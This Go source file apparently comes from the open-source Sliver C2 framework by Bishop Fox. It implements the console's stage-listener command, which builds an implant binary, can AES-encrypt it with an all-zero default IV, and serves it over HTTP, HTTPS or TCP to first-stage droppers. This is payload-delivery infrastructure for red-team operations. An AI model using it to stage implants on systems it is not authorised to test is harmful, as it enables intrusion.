package jobs

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"net/url"
	"strconv"

	"github.com/bishopfox/sliver/client/command/generate"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/util"
	"github.com/desertbit/grumble"
)

// StageListenerCmd --url [tcp://ip:port | http://ip:port ] --profile name
func StageListenerCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	profileName := ctx.Flags.String("profile")
	listenerURL := ctx.Flags.String("url")
	aesEncryptKey := ctx.Flags.String("aes-encrypt-key")
	aesEncryptIv := ctx.Flags.String("aes-encrypt-iv")

	if profileName == "" || listenerURL == "" {
		con.PrintErrorf("Missing required flags, see `help stage-listener` for more info\n")
		return
	}

	// parse listener url
	stagingURL, err := url.Parse(listenerURL)
	if err != nil {
		con.PrintErrorf("Listener-url format not supported")
		return
	}
	stagingPort, err := strconv.ParseUint(stagingURL.Port(), 10, 32)
	if err != nil {
		con.PrintErrorf("error parsing staging port: %v\n", err)
		return
	}

	profile := generate.GetImplantProfileByName(profileName, con)
	if profile == nil {
		con.PrintErrorf("Profile not found\n")
		return
	}

	aesEncrypt := false
	if aesEncryptKey != "" {
		// check if aes encryption key is correct length
		if len(aesEncryptKey)%16 != 0 {
			con.PrintErrorf("Incorect length of AES Key\n")
			return
		}

		// set default aes iv
		if aesEncryptIv == "" {
			aesEncryptIv = "0000000000000000"
		}

		// check if aes iv is correct length
		if len(aesEncryptIv)%16 != 0 {
			con.PrintErrorf("Incorect length of AES IV\n")
			return
		}

		aesEncrypt = true
	}

	stage2, err := generate.GetSliverBinary(profile, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if aesEncrypt {
		stage2 = util.PreludeEncrypt(stage2, []byte(aesEncryptKey), []byte(aesEncryptIv))
	}

	switch stagingURL.Scheme {
	case "http":
		ctrl := make(chan bool)
		con.SpinUntil("Starting HTTP staging listener...", ctrl)
		stageListener, err := con.Rpc.StartHTTPStagerListener(context.Background(), &clientpb.StagerListenerReq{
			Protocol: clientpb.StageProtocol_HTTP,
			Data:     stage2,
			Host:     stagingURL.Hostname(),
			Port:     uint32(stagingPort),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			con.PrintErrorf("Error starting HTTP staging listener: %s\n", err)
			return
		}
		con.PrintInfof("Job %d (http) started\n", stageListener.GetJobID())
	case "https":
		cert, key, err := getLocalCertificatePair(ctx)
		if err != nil {
			con.Println()
			con.PrintErrorf("Failed to load local certificate %s\n", err)
			return
		}
		ctrl := make(chan bool)
		con.SpinUntil("Starting HTTPS staging listener...", ctrl)
		stageListener, err := con.Rpc.StartHTTPStagerListener(context.Background(), &clientpb.StagerListenerReq{
			Protocol: clientpb.StageProtocol_HTTPS,
			Data:     stage2,
			Host:     stagingURL.Hostname(),
			Port:     uint32(stagingPort),
			Cert:     cert,
			Key:      key,
			ACME:     ctx.Flags.Bool("lets-encrypt"),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			con.PrintErrorf("Error starting HTTPS staging listener: %v\n", err)
			return
		}
		con.PrintInfof("Job %d (https) started\n", stageListener.GetJobID())
	case "tcp":
		ctrl := make(chan bool)
		con.SpinUntil("Starting TCP staging listener...", ctrl)
		stageListener, err := con.Rpc.StartTCPStagerListener(context.Background(), &clientpb.StagerListenerReq{
			Protocol: clientpb.StageProtocol_TCP,
			Data:     stage2,
			Host:     stagingURL.Hostname(),
			Port:     uint32(stagingPort),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			con.PrintErrorf("Error starting TCP staging listener: %v\n", err)
			return
		}
		con.PrintInfof("Job %d (tcp) started\n", stageListener.GetJobID())

	default:
		con.PrintErrorf("Unsupported staging protocol: %s\n", stagingURL.Scheme)
		return
	}

	if aesEncrypt {
		con.PrintInfof("AES KEY: %v\n", aesEncryptKey)
		con.PrintInfof("AES IV: %v\n", aesEncryptIv)
	}
}
